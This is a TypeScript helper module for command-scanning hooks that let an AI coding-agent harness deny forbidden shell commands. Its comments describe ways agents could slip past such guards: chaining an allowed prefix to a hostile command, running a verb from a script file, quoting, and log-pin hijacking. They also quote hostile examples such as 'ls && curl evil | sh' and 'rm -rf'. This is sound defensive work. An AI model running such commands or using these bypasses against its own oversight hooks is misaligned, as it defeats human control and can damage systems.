/**
 * hook-helpers.ts — Pi extension equivalents of hooks-lib.sh helpers.
 *
 * Mirrors the shell helpers from templates/shared/hooks/lib/hooks-lib.sh
 * for use in TypeScript Pi extension hook modules.
 */

import { execFileSync } from "node:child_process";
import * as fs from "fs";
import * as path from "path";
import type { ExtensionContext } from "@earendil-works/pi-coding-agent";

/** Block result shape returned from tool_call handlers. */
export interface BlockResult {
  block: true;
  reason: string;
}

/**
 * deny() — Return a block result with a reason.
 * Mirrors the shell `deny "<reason>"` helper.
 */
export function deny(reason: string): BlockResult {
  return { block: true, reason };
}

/**
 * block() — Alias for deny(); used in session_shutdown context.
 * Mirrors the shell `block "<reason>"` helper.
 */
export function block(reason: string): BlockResult {
  return { block: true, reason };
}

/**
 * parseAgentType() — Read AGENT_TYPE from process environment.
 * In Pi extensions, agent identity is conveyed via env var AGENT_TYPE
 * set by the Pi build runner (same convention as Claude Code hooks).
 */
export function parseAgentType(): string {
  return process.env["AGENT_TYPE"] ?? "";
}

/**
 * isOuterSession() — True when AGENT_TYPE is unset (caller is the orchestrator
 * or outer session, not a subagent).
 * Mirrors the shell `is_outer_session` helper.
 */
export function isOuterSession(): boolean {
  return parseAgentType() === "";
}

/**
 * isSubagent() — True when AGENT_TYPE is set (caller is a subagent).
 * Mirrors the shell `is_subagent` helper.
 */
export function isSubagent(): boolean {
  return parseAgentType() !== "";
}

/**
 * matchesAgentType() — True when the current agent type matches one of the
 * provided patterns. Supports exact match and glob prefix (e.g. "developer-*").
 */
export function matchesAgentType(patterns: string[]): boolean {
  const agentType = parseAgentType();
  return patterns.some((pattern) => {
    if (pattern === "*" || pattern === "all") return true;
    if (pattern.endsWith("-*")) {
      const prefix = pattern.slice(0, -2);
      return agentType.startsWith(prefix + "-") || agentType === prefix;
    }
    return agentType === pattern;
  });
}

/** Log debug info to stderr (non-blocking). */
export function debugLog(slug: string, message: string): void {
  if (process.env["HOOK_DEBUG"]) {
    process.stderr.write(`[pi-enforcement:${slug}] ${message}\n`);
  }
}

/**
 * resolveRealPath() — Resolve a path to its canonical absolute form.
 * Falls back to path.resolve() when fs.realpathSync fails (non-existent path).
 * Mirrors hooks_realpath in hooks-lib.sh.
 */
export function resolveRealPath(filePath: string): string {
  try {
    return fs.realpathSync(filePath);
  } catch {
    return path.resolve(filePath);
  }
}

/**
 * repoRelative() — Convert a path to a repo-relative form.
 *
 * Given an absolute or relative path, returns the path relative to the repo root.
 * The root is resolved as the git toplevel of the file's own containing directory
 * (cwd-independent, via `git -C`). When git is unavailable or the path is not
 * inside a git repo, falls back to stripping the launch cwd
 * (CWD / CLAUDE_PROJECT_DIR / process.cwd()). If neither prefix matches, the
 * canonicalised path is returned as-is (absolute).
 *
 * Mirrors repo_relative() in hooks-lib.sh — bash↔TS parity is critical.
 */
export function repoRelative(filePath: string): string {
  // Relative paths are already repo-relative — pass through unchanged.
  if (!path.isAbsolute(filePath)) {
    return filePath;
  }
  const canonical = resolveRealPath(filePath);

  // Prefer the git toplevel of the file's own directory — cwd-independent.
  // Walk up to the first existing ancestor (file may not exist yet on a
  // fresh write), then ask git from there with -C.
  let probeDir = path.dirname(canonical);
  while (probeDir && !fs.existsSync(probeDir)) {
    const parent = path.dirname(probeDir);
    if (parent === probeDir) break;
    probeDir = parent;
  }
  if (fs.existsSync(probeDir)) {
    try {
      const out = execFileSync(
        "git",
        ["-C", probeDir, "rev-parse", "--show-toplevel"],
        { encoding: "utf8", stdio: ["ignore", "pipe", "ignore"] },
      ).trim();
      if (out) {
        const top = resolveRealPath(out);
        const topWithSlash = top.endsWith("/") ? top : top + "/";
        if (canonical.startsWith(topWithSlash)) {
          return canonical.slice(topWithSlash.length);
        }
      }
    } catch {
      // git absent or path not in a repo — fall through to launch-cwd strip.
    }
  }

  // Fallback: strip the launch cwd (preserves every case that works today).
  const rawCwd =
    process.env["CWD"] ?? process.env["CLAUDE_PROJECT_DIR"] ?? process.cwd();
  const canonicalCwd = resolveRealPath(rawCwd);
  const cwdWithSlash = canonicalCwd.endsWith("/")
    ? canonicalCwd
    : canonicalCwd + "/";
  if (canonical.startsWith(cwdWithSlash)) {
    return canonical.slice(cwdWithSlash.length);
  }
  return canonical;
}

/**
 * stripHeredocBodies() — Returns `command` with BOTH the BODY and the
 * closing delimiter LINE of every `<<DELIM` / `<<'DELIM'` / `<<"DELIM"` /
 * `<<-DELIM` heredoc removed — only the `<<...DELIM` OPENER line is kept.
 * Dropping the terminator line too (not just the body) keeps the opener as
 * ONE clean shell-chain segment for splitCommandSegments() — a bare
 * `EOF`/terminator line left behind would otherwise parse as its OWN
 * newline-separated segment and fail command-word resolution for a
 * perfectly legitimate heredoc invocation. Fail-closed subject transform,
 * same contract as stripQuoted(): a codegen-log heredoc BODY is arbitrary
 * role-authored prose that may legitimately contain any gated phrase — that
 * prose must never feed a command-scanning guard's verb match. Imperfect
 * stripping (an unterminated heredoc, an unrecognized delimiter form) can
 * only RETAIN a false positive, never introduce a false negative. Mirrors
 * strip_heredoc_bodies in hooks-lib.sh.
 */
export function stripHeredocBodies(command: string): string {
  const lines = command.split("\n");
  const out: string[] = [];
  let delim: string | null = null;
  let tabSuppressed = false;
  let inBody = false;

  const openerRe =
    /<<(-)?(?:'([A-Za-z_][A-Za-z0-9_]*)'|"([A-Za-z_][A-Za-z0-9_]*)"|([A-Za-z_][A-Za-z0-9_]*))/;

  for (const line of lines) {
    if (inBody) {
      const strippedLine = tabSuppressed ? line.replace(/^\t+/, "") : line;
      if (strippedLine === delim) {
        inBody = false;
      }
      continue;
    }
    out.push(line);
    const m = openerRe.exec(line);
    if (m) {
      delim = m[2] ?? m[3] ?? m[4] ?? null;
      tabSuppressed = Boolean(m[1]);
      if (delim) {
        inBody = true;
      }
    }
  }

  return out.join("\n");
}

/**
 * splitCommandGroups() — Splits `command` into HARD-BOUNDARY groups,
 * splitting ONLY on UNQUOTED &&, ||, ;, & and newline — deliberately NOT on
 * `|` (pipe), which splitCommandSegments() also splits on. A "group" is
 * therefore a full pipe-chain (`producer | consumer`), kept intact as one
 * array element. This is the containment primitive for isCodegenLogWrite()'s
 * invocation check below: a real invocation is exactly one pipe-chain whose
 * LAST stage is codegen-log; &&/;/& chaining a genuine codegen-log call to
 * something else is a DIFFERENT, separately-executed command and must never
 * be folded into the same exemption. Returns `null` on an unbalanced quote,
 * same contract as splitCommandSegments(). Mirrors split_command_groups in
 * hooks-lib.sh.
 */
export function splitCommandGroups(command: string): string[] | null {
  const groups: string[] = [];
  let seg = "";
  let inSingle = false;
  let inDouble = false;
  let i = 0;
  const len = command.length;

  while (i < len) {
    const ch = command[i];
    if (inSingle) {
      seg += ch;
      if (ch === "'") inSingle = false;
      i += 1;
      continue;
    }
    if (inDouble) {
      if (ch === "\\") {
        seg += command.slice(i, i + 2);
        i += 2;
        continue;
      }
      seg += ch;
      if (ch === '"') inDouble = false;
      i += 1;
      continue;
    }
    if (ch === "'") {
      inSingle = true;
      seg += ch;
      i += 1;
      continue;
    }
    if (ch === '"') {
      inDouble = true;
      seg += ch;
      i += 1;
      continue;
    }
    const next2 = command.slice(i, i + 2);
    if (next2 === "&&" || next2 === "||") {
      groups.push(seg);
      seg = "";
      i += 2;
      continue;
    }
    if (ch === ";" || ch === "&" || ch === "\n") {
      groups.push(seg);
      seg = "";
      i += 1;
      continue;
    }
    seg += ch;
    i += 1;
  }

  if (inSingle || inDouble) {
    return null;
  }

  groups.push(seg);
  return groups;
}

/**
 * isCodegenLogWrite() — True when the bash command actually INVOKES the
 * codegen-log CLI, never merely SPELLS the token somewhere inside it (a
 * heredoc/quoted body, or a chained command that mentions it in passing).
 * This is the SOLE legitimate session-log writer, and a codegen-log
 * heredoc/piped body can legitimately contain any gated phrase —
 * command-scanning guards must treat a real invocation as a log WRITE,
 * never the gated action its body narrates. Strips heredoc bodies first
 * (their content is DATA, not further commands) via stripHeredocBodies(),
 * then requires the ENTIRE command to be exactly ONE hard-boundary group
 * (splitCommandGroups — splits on &&/||/;/& but NOT |, so a real pipe-chain
 * stays one group): a command chained via &&/;/& to anything else (even a
 * real codegen-log call) is NEVER exempt, because that chain genuinely runs
 * a second, separate command. Within that single group, splits on `|`
 * (splitCommandSegments) and requires the LAST pipe stage to resolve
 * (commandWordOfSegment) to `codegen-log` (or a path ending in
 * /codegen-log), with every EARLIER stage resolving to a known
 * stdin-producer (printf, echo, cat — the real usage shape
 * `printf '%s' "$body" | codegen-log section ...`). So
 * `codegen-log append x && git commit -m y` is correctly NOT exempt (two
 * groups), `echo hi > log.jsonl && codegen-log init` is correctly NOT
 * exempt (two groups, even though one stage superficially resolves to
 * codegen-log), while `printf ... | codegen-log ...` and a bare heredoc-fed
 * `codegen-log section ... <<'EOF' ... EOF` (a single group, one stage)
 * both remain exempt. Fails CLOSED (returns false) on an unparseable
 * command (unbalanced quote), a blank command, more than one hard-boundary
 * group, or a pipe-chain whose last stage isn't codegen-log or whose
 * earlier stages aren't producers. Mirrors is_codegen_log_write in
 * hooks-lib.sh.
 */
export function isCodegenLogWrite(command: string): boolean {
  const stripped = stripHeredocBodies(command);
  const groups = splitCommandGroups(stripped);
  if (groups === null) {
    return false;
  }

  const nonBlankGroups = groups.filter((g) => g.trim() !== "");
  if (nonBlankGroups.length !== 1) {
    return false;
  }

  const stages = splitCommandSegments(nonBlankGroups[0]);
  if (stages === null) {
    return false;
  }

  const nonBlankStages = stages.filter((s) => s.trim() !== "");
  if (nonBlankStages.length < 1) {
    return false;
  }

  const lastIdx = nonBlankStages.length - 1;
  for (let idx = 0; idx < nonBlankStages.length; idx++) {
    const word = commandWordOfSegment(nonBlankStages[idx]);
    if (idx === lastIdx) {
      if (word !== "codegen-log" && !word.endsWith("/codegen-log")) {
        return false;
      }
    } else {
      if (word !== "printf" && word !== "echo" && word !== "cat") {
        return false;
      }
    }
  }

  return true;
}

/**
 * stripQuoted() — Returns `command` with single- and double-quoted spans
 * removed. Fail-closed subject transform for command-scanning deny guards: a
 * forbidden token INSIDE a quoted span (a remote-exec payload like
 * `ssh host "cat f | head"`, or a quoted string argument like
 * `grep -n 'git stash' file`) is not a real local invocation of that token —
 * matching the stripped residue means an unquoted (real, local) occurrence
 * still matches and is still denied, while a quoted (remote/string)
 * occurrence is removed and bypasses. Imperfect stripping (escaped/nested
 * quotes) can only RETAIN a false positive, never introduce a false
 * negative. Mirrors the isCodegenLogWrite pre-match bypass precedent above.
 */
export function stripQuoted(command: string): string {
  return command.replace(/'[^']*'/g, "").replace(/"[^"]*"/g, "");
}

/**
 * stripGitGlobalOpts() — Returns `command` with git's global options removed
 * from between the `git` token and its subcommand, so
 * `git -C /tmp/x commit -m y` normalizes to `git commit -m y` before
 * verb-matching. Closed, documented set (see `man git`, GLOBAL OPTIONS):
 * -C <path>, -c <k=v>, --git-dir[=path], --work-tree[=path],
 * --exec-path[=path], --namespace[=ns], --no-pager, --no-replace-objects,
 * --literal-pathspecs, --bare, -p/--paginate, -P. Consumes ONLY tokens
 * matching these known option shapes and STOPS at the first token that does
 * not match one — that token is the subcommand (the verb) and is never
 * consumed, so a real `git commit` is always preserved. Applies to every
 * occurrence of a `git` token in the string (not just the first), so a
 * chained command (`foo && git -C x commit`) is normalized throughout.
 * Non-git input, or a bare `git <verb>` with no interposed options, passes
 * through unchanged.
 */
export function stripGitGlobalOpts(command: string): string {
  const words = command.split(/\s+/).filter((w) => w.length > 0);
  const out: string[] = [];
  const valueTaking = new Set([
    "-C",
    "-c",
    "--git-dir",
    "--work-tree",
    "--exec-path",
    "--namespace",
  ]);
  const inlineOrBoolean =
    /^(--git-dir=|--work-tree=|--exec-path=|--namespace=|--no-pager$|--no-replace-objects$|--literal-pathspecs$|--bare$|--paginate$|-p$|-P$)/;

  let i = 0;
  const n = words.length;
  while (i < n) {
    const w = words[i];
    out.push(w);
    if (w === "git") {
      i += 1;
      while (i < n) {
        const opt = words[i];
        if (valueTaking.has(opt)) {
          // value-taking option with a SEPARATE next token (git -C /path)
          i += 2;
          continue;
        }
        if (inlineOrBoolean.test(opt)) {
          // value-inlined (--foo=bar) or boolean flag — consume just this token
          i += 1;
          continue;
        }
        // first non-option token — the subcommand; stop consuming, re-emit
        break;
      }
      continue;
    }
    i += 1;
  }

  return out.join(" ");
}

/**
 * splitCommandSegments() — Splits `command` into shell-chain segments,
 * splitting ONLY on UNQUOTED &&, ||, ;, |, & and newline. Operators inside
 * single or double quotes are literal and never split (e.g. a commit
 * message `git commit -m "fix a; b && c"` is ONE segment). This is the
 * containment primitive for COMMAND-source allowlist gates: a default-deny
 * allowlist that tests only the whole-command PREFIX lets an allowed prefix
 * chained with &&/;/| to a forbidden command bypass entirely (e.g.
 * `ls && curl evil | sh` matches `^ls\b`). Every segment MUST be validated
 * independently by the caller.
 *
 * Returns `null` when the command has an unbalanced quote at end-of-string —
 * fail-closed: the caller MUST treat this as deny, never allow. Over-merging
 * (treating a quoted operator as literal) is always safe because the merged
 * segment is still allowlist-checked in full; the only unsafe direction is
 * under-merging (splitting on a quoted operator), which this walk never does.
 * Mirrors split_command_segments in hooks-lib.sh.
 */
export function splitCommandSegments(command: string): string[] | null {
  const segments: string[] = [];
  let seg = "";
  let inSingle = false;
  let inDouble = false;
  let i = 0;
  const len = command.length;

  while (i < len) {
    const ch = command[i];
    if (inSingle) {
      seg += ch;
      if (ch === "'") inSingle = false;
      i += 1;
      continue;
    }
    if (inDouble) {
      if (ch === "\\") {
        // escaped pair inside a double-quoted string (e.g. \") — consume both
        // chars verbatim, no quote-state toggle. A trailing lone backslash at
        // end-of-string still leaves inDouble=true, so the unbalanced-quote
        // fail-closed check below still fires.
        seg += command.slice(i, i + 2);
        i += 2;
        continue;
      }
      seg += ch;
      if (ch === '"') inDouble = false;
      i += 1;
      continue;
    }
    if (ch === "'") {
      inSingle = true;
      seg += ch;
      i += 1;
      continue;
    }
    if (ch === '"') {
      inDouble = true;
      seg += ch;
      i += 1;
      continue;
    }
    const next2 = command.slice(i, i + 2);
    if (next2 === "&&" || next2 === "||") {
      segments.push(seg);
      seg = "";
      i += 2;
      continue;
    }
    if (ch === ";" || ch === "|" || ch === "&" || ch === "\n") {
      segments.push(seg);
      seg = "";
      i += 1;
      continue;
    }
    seg += ch;
    i += 1;
  }

  if (inSingle || inDouble) {
    return null;
  }

  segments.push(seg);
  return segments;
}

const WRAPPER_PREFIXES = new Set([
  "sudo",
  "env",
  "nohup",
  "time",
  "command",
  "exec",
]);
const ENV_ASSIGNMENT_RE = /^[A-Za-z_][A-Za-z0-9_]*=/;

/**
 * commandWordOfSegment() — Resolves the real COMMAND WORD of one shell-chain
 * segment (as produced by splitCommandSegments), after stripping leading
 * `VAR=val` environment assignments and known wrapper prefixes (sudo, env,
 * nohup, time, command, exec — each consumed once, repeatedly, so
 * `sudo env FOO=1 exec rm -rf /x` resolves to `rm`). Returns "" when the
 * segment has no resolvable command word (blank segment) — callers MUST
 * treat empty as "could not resolve" and fail CLOSED (deny), never allow.
 * Mirrors command_word_of_segment in hooks-lib.sh.
 */
export function commandWordOfSegment(segment: string): string {
  const words = segment.split(/\s+/).filter((w) => w.length > 0);
  let i = 0;
  const n = words.length;
  while (i < n) {
    const w = words[i];
    if (ENV_ASSIGNMENT_RE.test(w)) {
      i += 1;
      continue;
    }
    if (WRAPPER_PREFIXES.has(w)) {
      i += 1;
      continue;
    }
    break;
  }
  return i >= n ? "" : words[i];
}

/**
 * segmentArgvOf() — Returns the argv (space-joined remainder) of a segment
 * AFTER its resolved command word (and any env-assignment/wrapper prefixes
 * consumed to reach it). Mirrors segment_argv_of in hooks-lib.sh.
 */
export function segmentArgvOf(segment: string): string {
  const words = segment.split(/\s+/).filter((w) => w.length > 0);
  let i = 0;
  const n = words.length;
  while (i < n) {
    const w = words[i];
    if (ENV_ASSIGNMENT_RE.test(w) || WRAPPER_PREFIXES.has(w)) {
      i += 1;
      continue;
    }
    break;
  }
  if (i >= n) return "";
  return words.slice(i + 1).join(" ");
}

/**
 * commandInvokes() — Fail-closed, command-POSITION-aware match: true only
 * when at least one shell-chain segment of `command` actually INVOKES a
 * command whose resolved command word matches `wordRe`, AND — when `argvRe`
 * is given — that segment's remaining argv also matches `argvRe`.
 *
 * This is the fix for the mention-vs-invocation collapse: a forbidden token
 * appearing as a grep PATTERN, an echo STRING, or any other non-command-word
 * position (`grep -c kill foo.sh`, `echo 'git push'`) never matches, because
 * the match is scoped to commandWordOfSegment's resolved first token, not
 * the raw line. A real invocation, however deeply wrapped (`sudo env
 * FOO=1 rm -rf /x`) or nested inside an inline interpreter payload
 * (`bash -c 'kill 123'`, recursed one level via <interpreter> -c <payload>),
 * still matches.
 *
 * Fails CLOSED (returns true — treat as an invocation, i.e. the caller
 * should deny) when splitCommandSegments cannot parse (unbalanced quote).
 * A blank segment (nothing to resolve) is skipped, never treated as a match.
 * Mirrors command_invokes in hooks-lib.sh.
 */
export function commandInvokes(
  command: string,
  wordRe: RegExp,
  argvRe?: RegExp,
): boolean {
  const segments = splitCommandSegments(command);
  if (segments === null) {
    // unbalanced quote — fail closed: treat as a match so the caller denies.
    return true;
  }

  for (const seg of segments) {
    if (seg.trim() === "") continue;

    const word = commandWordOfSegment(seg);
    if (word === "") continue;

    if (wordRe.test(word)) {
      if (!argvRe) return true;
      const argv = segmentArgvOf(seg);
      if (argvRe.test(argv)) return true;
    }

    // Recurse into inline-interpreter payloads: bash -c '<payload>', sh -c,
    // zsh -c — the payload is itself a command string and may contain the
    // real invocation one level down (bash -c 'kill 123').
    if (word === "bash" || word === "sh" || word === "zsh") {
      const argv = segmentArgvOf(seg);
      const m = /^-c\s+([\s\S]*)$/.exec(argv);
      if (m) {
        let payload = m[1];
        payload = payload.replace(/^'/, "").replace(/'$/, "");
        payload = payload.replace(/^"/, "").replace(/"$/, "");
        if (commandInvokes(payload, wordRe, argvRe)) return true;
      }
    }
  }

  return false;
}

/**
 * expandCommandIndirection() — Returns `command` UNCHANGED, plus (on a
 * following line, per resolved segment) the body of any argv-referenced
 * script a `bash`/`sh`/`zsh`/`source`/`.` segment invokes — closing the
 * blind spot where a destructive verb is written to a file in one Bash call
 * and run via `bash /tmp/x.sh` in a later call: the COMMAND-source guards
 * only ever test the raw command string itself, so a verb sitting inside the
 * referenced file's body was invisible to them.
 *
 * Additive-only, by construction: the returned string always STARTS WITH the
 * original `command` — every existing pattern that matched before still
 * matches. A resolved file's body is appended on its OWN newline (never
 * concatenated onto the same line) so line-anchored patterns are never
 * falsely satisfied by the seam between command and body.
 *
 * Resolution, per shell-chain segment (via splitCommandSegments):
 *   - command word (commandWordOfSegment) must be exactly one of
 *     bash | sh | zsh | source | .
 *   - the segment's first argv token (segmentArgvOf) that does not start
 *     with '-' and contains no '<' or '>' (ruling out flags, process
 *     substitution, and redirects) is the candidate path
 *   - the candidate is resolved AS-IS (cwd-relative or absolute) and must be
 *     a readable regular file — anything else (missing file, directory,
 *     unresolved $var, device) is left unresolved
 *
 * Recursion depth is 1: a resolved body that itself runs `bash other.sh` is
 * NOT chased into a second file.
 *
 * Fails OPEN to "unresolved" (never fails closed, never throws): any
 * segment that cannot be parsed, whose command word isn't an interpreter, or
 * whose candidate path doesn't resolve to a readable regular file is simply
 * skipped — the base command text is still returned untouched.
 * Mirrors expand_command_indirection in hooks-lib.sh.
 */
export function expandCommandIndirection(command: string): string {
  const segments = splitCommandSegments(command);
  if (segments === null) {
    // unbalanced quote — nothing to safely resolve; return unchanged.
    return command;
  }

  let out = command;

  for (const seg of segments) {
    if (seg.trim() === "") continue;

    const word = commandWordOfSegment(seg);
    if (
      word !== "bash" &&
      word !== "sh" &&
      word !== "zsh" &&
      word !== "source" &&
      word !== "."
    ) {
      continue;
    }

    const argv = segmentArgvOf(seg);
    const tokens = argv.split(/\s+/).filter((t) => t.length > 0);
    let candidate = "";
    for (const tok of tokens) {
      if (tok.startsWith("-") || tok.includes("<") || tok.includes(">"))
        continue;
      candidate = tok;
      break;
    }

    if (!candidate) continue;

    try {
      const stat = fs.statSync(candidate);
      if (!stat.isFile()) continue;
      fs.accessSync(candidate, fs.constants.R_OK);
      const body = fs.readFileSync(candidate, "utf8");
      out = out + "\n" + body;
    } catch {
      // unresolved (missing, not a file, unreadable) — skip, fail open.
      continue;
    }
  }

  return out;
}

/** Unused ctx parameter helper — avoids lint warnings in hook modules that don't use ctx. */
export function voidCtx(_ctx: ExtensionContext): void {
  // intentionally unused
}

/**
 * getActiveStepLog() — Resolve the active codegen/logging/*.jsonl cycle log
 * for a project dir.
 *
 * Resolution order (mirrors codegen-log's resolve_log_file precedence):
 *   0. process.env.CODEGEN_LOG_PATH, IFF set and the path exists on disk.
 *      This is the loop's own pin for the cycle's log, and every role
 *      invocation (Pi included) carries it — hook processes inherit env the
 *      same way Claude's do (verified live). Binding to the pin FIRST, ahead
 *      of the sentinel, is what stops a same-process `codegen-log init` with
 *      a mistyped/rival slug from hijacking .active out from under a guard
 *      that is grading THIS cycle's log. A dangling pin (unset, or pointing
 *      at a path that no longer exists) falls through to step 1, never
 *      wedges the guard.
 *   1. codegen/logging/.active sentinel (written by `codegen-log init` /
 *      `relocate`), IFF it points at a path that still exists on disk. Full
 *      fidelity for Pi: this is a synchronous disk read, so unlike the Claude
 *      transcript-scan fallback it needs no flush timing workaround — the
 *      sentinel is native ground truth here.
 *   2. Most recently modified canonical *.jsonl file in codegen/logging/
 *      (mtime scan, `progress` files excluded) — belt-and-suspenders when no
 *      sentinel is present (fixtures that never ran codegen-log init) or the
 *      sentinel is stale (points at a relocated/deleted log).
 *
 * Returns null when codegen/logging/ does not exist or contains no matches.
 */
export function getActiveStepLog(projectDir: string): string | null {
  const pinned = process.env.CODEGEN_LOG_PATH;
  if (pinned && fs.existsSync(pinned)) {
    return pinned;
  }

  const loggingDir = path.join(projectDir, "codegen", "logging");
  if (!fs.existsSync(loggingDir)) return null;

  const sentinelPath = path.join(loggingDir, ".active");
  if (fs.existsSync(sentinelPath)) {
    try {
      const pointee = fs.readFileSync(sentinelPath, "utf8").trim();
      if (pointee && fs.existsSync(pointee)) {
        return pointee;
      }
    } catch {
      // Unreadable sentinel — fall through to mtime scan.
    }
  }

  let logFiles: { name: string; mtime: number }[];
  try {
    logFiles = fs
      .readdirSync(loggingDir)
      .filter((f) => f.endsWith(".jsonl") && !f.includes("progress"))
      .map((f) => ({
        name: f,
        mtime: fs.statSync(path.join(loggingDir, f)).mtimeMs,
      }))
      .sort((a, b) => b.mtime - a.mtime);
  } catch {
    return null;
  }

  if (logFiles.length === 0) return null;
  return path.join(loggingDir, logFiles[0].name);
}

/** Shape of codegen/gate-pending/cycle-state.json (mirrors cycle-state.sh). */
export interface CycleState {
  state: string;
  step_log: string;
  session_id: string;
  verdict: string;
  updated_at: string;
}

/**
 * getCycleState() — reads codegen/gate-pending/cycle-state.json for a
 * project dir. Mirrors cycle-state.sh's cycle_state_get and friends.
 * Returns null when the file is absent, unreadable, or malformed JSON.
 */
export function getCycleState(projectDir: string): CycleState | null {
  const f = path.join(
    projectDir,
    "codegen",
    "gate-pending",
    "cycle-state.json",
  );
  if (!fs.existsSync(f)) return null;
  try {
    const parsed = JSON.parse(fs.readFileSync(f, "utf8"));
    return {
      state: typeof parsed.state === "string" ? parsed.state : "",
      step_log: typeof parsed.step_log === "string" ? parsed.step_log : "",
      session_id:
        typeof parsed.session_id === "string" ? parsed.session_id : "",
      verdict: typeof parsed.verdict === "string" ? parsed.verdict : "",
      updated_at:
        typeof parsed.updated_at === "string" ? parsed.updated_at : "",
    };
  } catch {
    return null;
  }
}

/**
 * getGateVerdict() — reads codegen/gate-pending/gate-result.json's .verdict
 * field for a project dir. Mirrors gate-result.sh's gate_result_verdict.
 * Returns "" when the file is absent, unreadable, malformed JSON, or the
 * field is missing/non-string — never throws.
 */
export function getGateVerdict(projectDir: string): string {
  const f = path.join(
    projectDir,
    "codegen",
    "gate-pending",
    "gate-result.json",
  );
  if (!fs.existsSync(f)) return "";
  try {
    const parsed = JSON.parse(fs.readFileSync(f, "utf8"));
    return typeof parsed.verdict === "string" ? parsed.verdict : "";
  } catch {
    return "";
  }
}
